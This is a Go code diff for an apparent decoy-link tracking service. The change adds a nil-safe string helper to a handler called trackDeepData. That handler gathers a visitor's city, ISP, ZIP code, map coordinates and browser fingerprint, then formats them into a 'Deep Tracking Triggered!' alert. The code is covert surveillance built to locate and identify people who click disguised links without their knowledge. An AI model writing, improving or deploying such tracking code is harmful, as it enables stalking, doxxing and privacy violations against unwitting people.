@@ -17,6 +17,13 @@ import (
 	"github.com/gin-gonic/gin"
 )
 
+func safeString(val interface{}) string {
+	if val == nil {
+		return "N/A"
+	}
+	return fmt.Sprintf("%v", val)
+}
+
 type LinkData struct {
 	DecoyURL string `json:"decoyUrl"`
 }
@@ -94,14 +101,14 @@ func trackDeepData(c *gin.Context) {
 	defer f.Close()
 	f.WriteString(entry)
 
-	geoSummary := fmt.Sprintf("\nLocation: %s, %s (%s)\nISP: %s\nRegion: %s\nOrg: %s\nZIP: %s\nCoords: https://www.google.com/maps?q=%v,%v",
-		data.Geo["city"], data.Geo["country"], data.Geo["countryCode"],
-		data.Geo["isp"], data.Geo["regionName"], data.Geo["org"], data.Geo["zip"],
-		data.Geo["lat"], data.Geo["lon"])
+	geoSummary := fmt.Sprintf("\nLocation: %s, %s (%s)\nISP: %s\nRegion: %s\nOrg: %s\nZIP: %s\nCoords: https://www.google.com/maps?q=%s,%s",
+		safeString(data.Geo["city"]), safeString(data.Geo["country"]), safeString(data.Geo["countryCode"]),
+		safeString(data.Geo["isp"]), safeString(data.Geo["regionName"]), safeString(data.Geo["org"]), safeString(data.Geo["zip"]),
+		safeString(data.Geo["lat"]), safeString(data.Geo["lon"]))
 
 	fp := data.Fingerprint
 	fpDetails := fmt.Sprintf("\n\n🧠 *Fingerprint Info:*\nUser-Agent: `%s`\nPlatform: `%s`\nLang: `%s`\nScreen: `%s`\nTouch: `%v`\nDNT: `%v`\nTimezone: `%s`",
-		fp["userAgent"], fp["platform"], fp["language"], fp["screen"], fp["touchSupport"], fp["dnt"], fp["timezone"])
+		safeString(fp["userAgent"]), safeString(fp["platform"]), safeString(fp["language"]), safeString(fp["screen"]), safeString(fp["touchSupport"]), safeString(fp["dnt"]), safeString(fp["timezone"]))
 
 	summary := fmt.Sprintf("📍 *Deep Tracking Triggered!*\nID: `%s`\nDuration: `%dms`\nClicks/Moves: `%d`%s%s%s",
 		data.ID,
